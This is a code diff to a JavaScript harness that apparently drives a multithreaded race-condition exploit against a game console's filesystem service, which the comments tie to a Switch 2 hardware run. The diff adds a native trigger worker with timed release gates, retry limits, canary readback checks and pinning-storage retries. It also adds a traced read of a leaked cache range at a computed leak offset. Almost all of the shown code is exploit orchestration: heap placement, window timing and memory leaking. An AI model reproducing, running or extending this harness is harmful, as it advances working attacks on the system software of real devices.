@@ -12,13 +12,21 @@ const normalizedPath = require("./normalized-path.cjs");
 const {qualifyOverlap} = require("./wave-overlap.cjs");
 const {packet, response} = require("../../shared/ipc.cjs");
 const functions = require("../../shared/sdk-functions.json");
+const {PinningWindowMiss, releasablePinningControl, retryablePinningMiss,
+  retryPinningControl} = require('./pinning-control.cjs');
+const positiveReadback = require('./positive-readback.cjs');
+const localRelease = require('./local-release.cjs');
+const rangeReadTrace = require('./range-read-trace.cjs');
 
 async function main() {
+  const localDelayMs = localRelease.delayFromEnv();
   // Fixed geometry and bounded attempts from the Switch 2 hardware run.
   const probeReadSize = 0x180000, markerOffset = 0x2340;
   const trialRange = 0x600000, cacheReadSize = 0x200000, fragmentCount = 16;
   const minimumCacheHeld = 0x2810, metadataAttempts = 4, fieldCopies = 2;
   const waveAttempts = 30;
+  const unselectedExtentLimit = 8;
+  const unchangedCanaryLimit = 8;
   const plannerCycle = 0x28000;
   const canonicalPlanner = require('./cache-address-plan.cjs');
   const addressPlanner = (target, size) => require('./signed-cache-plan.cjs').plan(target, size, plannerCycle);
@@ -36,7 +44,7 @@ async function main() {
   const {verifyWorkerCode, code} = require(path.join(directory, 'worker.cjs'));
   const {normal, raw} = paths(s, domain);
   const b = s.base, master = b + 0x3000, holeDone = b + 0x3010, groupReleased = b + 0x3020;
-  const guardLaunched = b + 0x3030, spacingDecision = b + 0x2a20;
+  const guardLaunched = b + 0x3030, armGate = b + 0x3040, spacingDecision = b + 0x2a20;
   const completedFlag = b + 0x2a08, completedDecision = b + 0x2a0c;
   const holeFinished = b + 0x2a10, earlyHole = b + 0x2a14, holeDecision = b + 0x2a18;
   const zeroByte = b + 0x2a1c;
@@ -52,9 +60,13 @@ async function main() {
   const tailInputs = Array.from({length: 4}, (_, i) => b + 0x32000 + i * 0x2000);
   const report = {session: live.session, scratch, canary, extent, markerOffset,
     probeReadSize, trialRange, cacheReadSize, fragmentCount, minimumCacheHeld,
-    metadataAttempts, fieldCopies, waveAttempts, plannerCycle,
-    started: new Date().toISOString(), cases: []};
+    metadataAttempts, fieldCopies, waveAttempts, unselectedExtentLimit,
+    unchangedCanaryLimit, plannerCycle,
+    started: new Date().toISOString(), cases: [],
+    localRelease: {mode: 'trigger-worker', delayMs: localDelayMs,
+      hostQuietTargetMs: localRelease.HOST_QUIET_MS, armState: 'not-armed', completed: false}};
   let saved, temporary, root, fileHandle, group, pinHandle, candidateHandle, originalRom, released = false;
+  let localReleaseMayHaveRun = false;
   let cacheNeedsRestore = false, restoreCandidate;
   let addressPlan;
   const save = reportWriter(file, () => ({...report, metrics: s.metrics, retained: {
@@ -174,7 +186,10 @@ async function main() {
     check(([native.restartAll, native.joinAll, affinity.pinAll].every(fn => typeof fn === 'function')),
       'Current helpers lack batching; bind current helpers or use --serial-host');
     await fs.copyFile(__filename, path.join(__dirname, label + '-source.cjs'));
-    for (const helper of ['cache-address-plan.cjs', 'fs-memory-control.cjs', 'session-tools.cjs', 'run-control.cjs', 'capture-workers.cjs', 'native-links.cjs', 'wave-overlap.cjs'])
+    for (const helper of ['cache-address-plan.cjs', 'fs-memory-control.cjs',
+      'session-tools.cjs', 'run-control.cjs', 'capture-workers.cjs',
+      'native-links.cjs', 'wave-overlap.cjs', 'pinning-control.cjs',
+      'positive-readback.cjs', 'local-release.cjs', 'range-read-trace.cjs'])
       await fs.copyFile(path.join(__dirname, helper), path.join(__dirname, label + '-' + helper));
     for (const helper of ['native-worker.cjs', 'affinity.cjs'])
       await fs.copyFile(path.join(directory, helper), path.join(__dirname, label + '-' + helper));
@@ -277,7 +292,7 @@ async function main() {
     for (let i = 0; i < 3; i++) clients.push(await clone(saved));
     clients.push({u32: b + 0x2a00}, await clone(saved), await clone(saved), {u32: b + 0x2a04});
     const savedTrigger = await clone(saved), tmpTrigger = await clone(temporary);
-    for (const gate of [master, holeDone, groupReleased, guardLaunched]) {
+    for (const gate of [master, holeDone, groupReleased, guardLaunched, armGate]) {
       await events.initialize(s, gate);
       gates.push(gate);
     }
@@ -301,7 +316,8 @@ async function main() {
     const delays = ([0, 300000, 350000, 450000, 550000, 650000, 1700000, 2000000, 2150000, 2800000]);
     report.workerDelaysNs = delays;
     const plans = roles.map((role, i) => {
-      const steps = [wait(master)];
+      const steps = i === 12 ? localRelease.triggerPrefix(localDelayMs, armGate, master,
+        {wait, sleep, tick, signal}) : [wait(master)];
       if (i < 10) steps.push(sleep(delays[i]));
       else if (i < 12) steps.push(wait(groupReleased), sleep((i - 10) * 150000));
       else steps.push(sleep(2400000), wait(groupReleased), wait(guardLaunched), sleep(400000),
@@ -325,9 +341,11 @@ async function main() {
       return steps;
     });
 
-    async function wave(profile, readSize, customPayload = null) {
+    async function wave(profile, readSize, customPayload = null, readbackFirstPositive = false) {
       await runControl.begin(profile);
       const hostStarted = performance.now(), hostRequests = s.metrics.requests;
+      const positiveHandlesBefore = readbackFirstPositive ? new Set(s.handles) : null;
+      const positivePinBefore = readbackFirstPositive ? pinHandle : null;
       const createPin = (!pinHandle);
       released = false;
       for (const gate of gates) await events.clear(s, gate);
@@ -381,6 +399,7 @@ async function main() {
       packets.push(pathPacket(7, Buffer.alloc(0), b + 0x40000, canarySize), Buffer.from(fillerRequest),
         Buffer.from(fillerRequest), null, Buffer.from(guardRequest), Buffer.from(guardRequest),
         pathPacket(7, Buffer.alloc(0), triggerInput, 0x800));
+      let preparedCanaryRequest;
       await s.measure('requests:' + profile, async () => {
         const writes = packets.flatMap((bytes, i) => bytes ? [{address: requests[i],
           bytes: context(bytes, i === 0 || i >= 2 && i < 6 ? 3 : 9)}] : []);
@@ -388,7 +407,14 @@ async function main() {
           {address: preReleaseBuffer, bytes: context(packet(1009))},
           {address: clearReportBuffer, bytes: context(packet(1009))});
         writes.push({address: pinBuffer, bytes: context(packet(createPin ? 200 : 1009))});
-        await s.write(requests[0], packPages(requests[0], 16 * 4096, writes));
+        const staged = packPages(requests[0], 16 * 4096, writes);
+        if (readbackFirstPositive) {
+          preparedCanaryRequest = context(pathPacket(7, Buffer.alloc(0), b + 0x40000, canarySize), 9);
+          check(staged.subarray(requests[6] - requests[0],
+            requests[6] - requests[0] + positiveReadback.REQUEST_BYTES).equals(preparedCanaryRequest),
+          'Staged positive canary request differs');
+        }
+        await s.write(requests[0], staged);
       });
       await s.measure('workers:' + profile, async () => {
         if ((workers.length === plans.length)) await native.restartAll(s, workers);
@@ -402,8 +428,39 @@ async function main() {
       report.active = {profile, readSize};
       await save();
       console.log(JSON.stringify({stage: 'prepared', ...report.active, file}));
+      let positiveBefore;
+      if (readbackFirstPositive) {
+        try {
+          positiveBefore = await positiveReadback.capture(s, b + 0x40000, canarySize, requests[6]);
+          positiveReadback.checkPrepared(positiveBefore, Buffer.from(canary + '\0'), preparedCanaryRequest);
+        } catch (error) {
+          report.firstPositiveGuardedRetry.preSignalError = error.message;
+          await save();
+          throw error;
+        }
+      }
+      // From this point the native trigger may release the batch even if the
+      // arm RPC fails to return. Never use the pre-release cancellation path.
       released = true;
-      await events.signal(s, master);
+      localReleaseMayHaveRun = true;
+      report.localRelease.armState = 'may-have-run';
+      await save();
+      console.log(JSON.stringify({stage: 'local-release-may-have-run',
+        delayMs: localDelayMs, file}));
+      try {
+        report.localRelease.arm = await localRelease.armAndQuiet({
+          signalArm: () => events.signal(s, armGate),
+          requests: () => s.metrics.requests,
+          now: () => performance.now(),
+          pause: ms => new Promise(resolve => setTimeout(resolve, ms)),
+        });
+        report.localRelease.armState = 'acknowledged';
+      } catch (error) {
+        report.placementUncertain = true;
+        report.localRelease.armError = error.stack;
+        await save();
+        throw error;
+      }
       await s.measure('join:' + profile, async () => {
         await native.joinAll(s, workers);
       });
@@ -452,6 +509,40 @@ async function main() {
           r.role === 'canary' && Buffer.from(r.inline, 'hex').readUInt32LE() !== 1).map(r => r.role),
         canaryResult: canaryRow.result,
         canaryType: canaryRow.result ? null : Buffer.from(canaryRow.inline, 'hex').readUInt32LE()};
+      if (readbackFirstPositive && hasWindow(row) && row.canaryResult === 0x2eea02 &&
+          row.changedPaths.length === 1 && row.changedPaths[0] === 'canary') {
+        row.positiveReadback = {scope: 'first-strict-positive-changed-result',
+          requestPageAfterIsIpcReply: true, preparedPathMatches: true,
+          preparedRequestMatches: true};
+        try {
+          const after = await positiveReadback.capture(s, b + 0x40000, canarySize, requests[6]);
+          Object.assign(row.positiveReadback, positiveReadback.describe(positiveBefore, after));
+          row.positiveReadback.postPathMatchesPrepared = after.path.equals(Buffer.from(canary + '\0'));
+        } catch (error) {row.positiveReadback.afterError = error.message;}
+      }
+      // A reported FS 6005 is unresolved until the post-wave guard decides.
+      // A failed report write or stop checkpoint must retain this state.
+      if (readbackFirstPositive && row.canaryResult === 0x2eea02)
+        report.firstPositiveGuardPending = true;
+      const triggerWorker = workers[12];
+      const nativeTickUs = name => {
+        const index = triggerWorker.calls.findIndex(step => step.name === name);
+        check(index >= 0, 'Local release tick missing: ' + name);
+        return Number(triggerWorker.results[index] - origin) * 1e6 / frequency;
+      };
+      const nativeArmWakeUs = nativeTickUs('localArmWake');
+      const nativeSignalStartUs = nativeTickUs('localSignalStart');
+      const nativeSignalEndUs = nativeTickUs('localSignalEnd');
+      const nativeArmToSignalMs = (nativeSignalStartUs - nativeArmWakeUs) / 1000;
+      const nativeArmToWaveEndMs = (Math.max(...rows.map(item => item.endUs)) - nativeArmWakeUs) / 1000;
+      row.localRelease = {nativeArmWakeUs, nativeSignalStartUs, nativeSignalEndUs,
+        nativeArmToSignalMs, nativeArmToWaveEndMs,
+        releaseToCanaryEndUs: canaryRow.endUs - nativeSignalEndUs,
+        releaseToPinStartUs: rows.find(item => item.role === 'pin').startUs - nativeSignalEndUs,
+        arm: report.localRelease.arm,
+        qualified: localRelease.qualifyTiming({delayMs: localDelayMs,
+          ...report.localRelease.arm, nativeArmToSignalMs, nativeArmToWaveEndMs})};
+      report.localRelease.wave = row.localRelease;
       report.cases.push(row);
       delete report.active;
       await save();
@@ -469,12 +560,10 @@ async function main() {
         throw Error('A protected request ended during the overwrite; retain resources for recovery');
       }
       await closeGroup();
-      if (createPin) {
-        const pinRow = rows.find(r => r.role === 'pin');
-        check(canaryRow.startUs < pinRow.startUs && pinRow.endUs < canaryRow.endUs,
-          'Pinning storage was not created while the canary was pending');
-        check(row.newPersistentBytes === 13616, 'Pinning allocation cost changed');
-      }
+      const pinRow = rows.find(r => r.role === 'pin');
+      row.pinningCreated = createPin;
+      row.pinningOverlapped = canaryRow.startUs < pinRow.startUs && pinRow.endUs < canaryRow.endUs;
+      if (createPin) check(row.newPersistentBytes === 13616, 'Pinning allocation cost changed');
       check(rows.find(r => r.role === 'pin').result === 0, 'Pinning request failed');
       check(rows.filter(r => ['commit', 'hole', 'clearReport', 'preRelease'].includes(r.role)).every(r => r.result === 0), 'Ordinary gap request failed');
       check(rows.filter(r => r.role.startsWith('tail')).every(r => r.result === 0x320002), 'Deferred seed result differs');
@@ -492,25 +581,89 @@ async function main() {
       else if (!isExtent) check(trigger.result === 0x2eec02, 'Backslash control result differs');
       const health = await normal(saved, 7, canary);
       check(!health.result && health.data.readUInt32LE() === 1, 'Canary file changed on disk');
+      row.diskHealthy = true;
       row.host = {elapsedMs: performance.now() - hostStarted, requests: s.metrics.requests - hostRequests};
       await s.record({operation: 'waveTiming', profile, ...row.host,
         nativeElapsedMs: Math.max(...rows.map(row => row.endUs)) / 1000});
+      check(row.restored && row.diskHealthy && !group && !s.threads.size &&
+        workers.length === plans.length && workers.every(worker => worker.joined),
+      'Local release wave did not restore and join all workers');
+      // The arm is no longer uncertain once this wave has passed its owned
+      // state and disk checks. A checkpoint stop can now clean up safely.
+      localReleaseMayHaveRun = false;
       await runControl.end(profile);
+      if (createPin && !row.pinningOverlapped) {
+        // The reply, abort, path, disk and restoration checks have completed.
+        // A miss outside this owned initial control still ends the attempt.
+        if (retryablePinningMiss(row) && !candidateHandle && !cacheNeedsRestore &&
+            !report.placementUncertain && !s.threads.size && !group)
+          throw new PinningWindowMiss(row);
+        throw Error('Pinning storage was not created while the canary was pending');
+      }
+      if (readbackFirstPositive) row.positiveRetryState = {
+        waveChecksPassed: true, diskHealthy: row.diskHealthy,
+        workersJoined: workers.length === plans.length && workers.every(worker => worker.joined) && !s.threads.size,
+        groupClosed: !group,
+        ownedHandlesStable: positiveHandlesBefore.size === s.handles.size &&
+          [...positiveHandlesBefore].every(handle => s.handles.has(handle)),
+        pinStillOwned: !!positivePinBefore && pinHandle === positivePinBefore &&
+          s.handles.has(pinHandle) && !row.pinningCreated,
+        noCandidateCacheOrUncertainty: !candidateHandle && !cacheNeedsRestore && !restoreCandidate &&
+          !report.cacheAlias && !report.cacheRange && !report.placementUncertain,
+      };
       return row;
     }
 
     const hasWindow = row => row.restored && !row.triggerAborted && row.allPending && row.receiveOrderMarginUs >= 300 &&
       row.preReleaseUsed >= 0x2600;
-    async function retryWave(profile) {
+    async function retryWave(profile, readbackFirstPositive = false) {
+      if (readbackFirstPositive) {
+        check(profile === 'positive', 'Guarded FS 6005 retry is first-positive only');
+        const diagnostic = report.firstPositiveGuardedRetry = {initialWaveLimit: waveAttempts,
+          absoluteWaveLimit: 60, extensionPerContinuation: 15, maxContinuations: 2,
+          wavesCompleted: 0, fs6005Observed: 0, continued: 0, decisions: []};
+        return positiveReadback.retryFirstPositive({
+          nextWave: () => wave(profile, probeReadSize, null, true), hasWindow,
+          state: row => row.positiveRetryState,
+          onWave: attempts => {diagnostic.wavesCompleted = attempts;},
+          onDecision: async decision => {
+            if (decision.kind === 'fs6005') diagnostic.fs6005Observed++;
+            diagnostic.continued = decision.continuations;
+            diagnostic.decisions.push(decision);
+            const rejected = decision.kind === 'fs6005' && !decision.continued;
+            await positiveReadback.persistFirstPositiveDecision(report, decision, save);
+            console.log(JSON.stringify({stage: 'first-positive-guarded-retry', ...decision}));
+            if (rejected) {
+              throw Error('First-positive FS 6005 retry rejected: ' + decision.reasons.join(', '));
+            }
+          },
+        });
+      }
       let row;
+      let unselectedExtentStreak = 0;
+      let unchangedCanaryStreak = 0;
       for (let attempt = 0; attempt < waveAttempts; attempt++) {
-        row = await wave(profile, probeReadSize);
+        row = await wave(profile, probeReadSize, null, readbackFirstPositive);
         if (!hasWindow(row)) continue;
-        if (profile === 'extent-present' && !row.selectedMarker) continue;
+        if (profile === 'extent-present' && !row.selectedMarker) {
+          if (++unselectedExtentStreak >= unselectedExtentLimit) {
+            report.unselectedExtentStop = {attempt: attempt + 1, streak: unselectedExtentStreak};
+            await save();
+            break;
+          }
+          continue;
+        }
         // An unchanged owned canary can be retried before a cache exists.
         // Other changed paths still fail the placement checks below.
         if (profile === 'positive' && row.canaryResult === 0 && row.canaryType === 1 &&
-            row.changedPaths.length === 0) continue;
+            row.changedPaths.length === 0) {
+          if (++unchangedCanaryStreak >= unchangedCanaryLimit) {
+            report.unchangedCanaryStop = {attempt: attempt + 1, streak: unchangedCanaryStreak};
+            await save();
+            break;
+          }
+          continue;
+        }
         break;
       }
       return row;
@@ -520,8 +673,32 @@ async function main() {
       check(row.selectedMarker && hasWindow(row), 'The interleaved input extent did not requalify');
     }
 
-    const abortControl = await wave('abort-control', probeReadSize);
+    async function releaseInitialPin(row, attempt) {
+      check(releasablePinningControl(row) && row.diskHealthy === true &&
+        pinHandle && s.handles.has(pinHandle) && !s.threads.size && !group &&
+        !candidateHandle && !cacheNeedsRestore && !report.placementUncertain,
+        'Cannot release the initial pin from this state');
+      const before = await memory();
+      await s.close(pinHandle);
+      pinHandle = null;
+      report.pinHandle = null;
+      const after = await memory();
+      const releasedBytes = after[5] - before[5];
+      row.pinningRetry = {attempt, before: before[5], after: after[5], releasedBytes};
+      await save();
+      check(releasedBytes === 13616, 'Initial pin release accounting differs; stop rather than retry');
+      console.log(JSON.stringify({stage: 'pinning-window-miss', attempt, releasedBytes,
+        willRetry: attempt < 3}));
+    }
+    const abortControl = await retryPinningControl(
+      () => wave('abort-control', probeReadSize), releaseInitialPin);
     check(abortControl.triggerAborted && abortControl.nativeGuard.completed === 1, 'Native abort control failed');
+    report.localRelease.initialPin = {attempts: report.cases.filter(row => row.profile === 'abort-control').length,
+      overlapped: abortControl.pinningOverlapped,
+      qualified: abortControl.localRelease.qualified};
+    await save();
+    console.log(JSON.stringify({stage: 'local-release-initial-pin',
+      delayMs: localDelayMs, ...report.localRelease.initialPin, file}));
     const holeAbortControl = await wave('abort-hole-control', probeReadSize);
     check(holeAbortControl.triggerAborted && holeAbortControl.nativeGuard.earlyHole === 1 &&
       holeAbortControl.nativeGuard.minimumSpacing === 1, 'Native receive-order abort failed');
@@ -532,11 +709,13 @@ async function main() {
     if (qualified) {
       const control = await retryWave('negative');
       if (hasWindow(control)) {
-        const positive = await retryWave('positive');
+        const positive = await positiveReadback.requireFirstPositiveRow(
+          await retryWave('positive', true), report, save);
         report.canaryChanged = positive.changedPaths.includes('canary') && positive.allPending &&
           positive.receiveOrderMarginUs >= 300;
         report.markerSelected = (report.canaryChanged) && positive.canaryType === 0 &&
           positive.changedPaths.every(name => name === 'canary') && hasWindow(positive);
+        if (report.markerSelected || positive.triggerAborted) report.firstPositiveGuardPending = false;
         if ((!positive.triggerAborted) && !report.markerSelected) {
           report.placementUncertain = true;
           await save();
@@ -717,7 +896,8 @@ async function main() {
             const range = report.cacheRange = {targetOffset: markerOffset, referenceRange: 0x4000,
               trialRange, readSize: cacheReadSize, readOffset: leakOffset,
               logicalRange: ('0x4141414141414141'),
-              clean: true, outputPoison: cache.outputPoison};
+              clean: true, outputPoison: cache.outputPoison,
+              traceEventsFile: s.log};
             // Keep this entry clean: its original allocation size is not yet
             // read from native memory, so no content Flush is appropriate.
             restoreCandidate = async () => {
@@ -747,7 +927,16 @@ async function main() {
                 {
                   if (attempt) await installCombinedLeak('combined-expand-retry-' + attempt);
                 }
-                const beforeRelease = await readStorage(candidateHandle, cacheReadSize, leakOffset);
+                if (attempt === 0) {
+                  try {console.log(JSON.stringify({stage: 'first-candidate-range-trace',
+                    eventsFile: s.log, readSize: cacheReadSize, readOffset: leakOffset}));}
+                  catch (_) {} // Host diagnostic output must not stop the read.
+                }
+                const beforeRelease = attempt === 0 ?
+                  await rangeReadTrace.readFirstCandidateRange({s, bulk, output,
+                    handle: candidateHandle, size: cacheReadSize, offset: leakOffset,
+                    poison: cache.outputPoison, u64}) :
+                  await readStorage(candidateHandle, cacheReadSize, leakOffset);
                 range.beforeReleaseResult = beforeRelease.result;
                 range.beforeReleasePrefixMatches = false;
                 range.beforeReleaseFirstDifference = null;
@@ -1035,8 +1224,10 @@ async function main() {
         }
       } else report.skipped = 'Negative control did not retain all paths in the required order';
     }
+    report.localRelease.completed = true;
     report.completed = true;
   } catch (error) {
+    if (localReleaseMayHaveRun) report.placementUncertain = true;
     if (error instanceof StopRequested) report.stopped = true;
     else {
       report.error = error.stack;
@@ -1055,6 +1246,7 @@ async function main() {
     }
   }
   finally {
+    if (report.firstPositiveGuardPending) report.placementUncertain = true;
     runControl.retire();
     try {
       if (!released && s.threads.size && await s.ready()) {
